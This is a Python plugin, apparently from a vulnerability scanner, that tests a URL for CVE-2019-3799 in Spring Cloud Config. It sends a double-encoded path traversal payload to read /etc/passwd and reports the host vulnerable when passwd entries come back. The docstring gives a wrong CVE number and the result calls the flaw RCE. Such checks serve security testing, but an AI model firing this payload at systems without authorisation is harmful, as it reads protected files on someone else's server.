#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2019_3799.py
   Description :
   Author :       sule01u
   date：          2023/10/9
"""
import requests
from urllib.parse import urljoin
from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
from colorama import Fore
from utils.logging_config import configure_logger

logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

CVE_ID = "CVE-2019-3799"


def check(url, dns_domain, proxies=None):
    """
    对给定的目标URL检测CVE-2019-3379漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    payload = "test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
    target_url = urljoin(url, payload)
    try:
        return _extracted_from_check_12(target_url, proxies, url)
    except requests.RequestException as e:
        logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}


# TODO Rename this here and in `check`
def _extracted_from_check_12(target_url, proxies, url):
    res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
    logger.debug(
        f"{Fore.CYAN}[{res.status_code}]{Fore.BLUE}" + f"[{res.headers}]",
        extra={"target": target_url},
    )
    vulnerable_signs = [
        r"x:0:0:root:/root:",
        r"/sbin/nologin",
        r"daemon"
    ]
    if res.status_code == 200 and all(sign in res.text for sign in vulnerable_signs):
        logger.info(
            f"{Fore.RED}[{CVE_ID} vulnerability detected!]",
            extra={"target": target_url},
        )
        return True, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"检测到{CVE_ID}的RCE漏洞",
            "response": f"{res.text[:200]}....",
        }
    logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
    return False, {}


if __name__ == '__main__':
    is_vul, res = check("http://localhost:8080/", "", proxies={})
    print(is_vul, res)
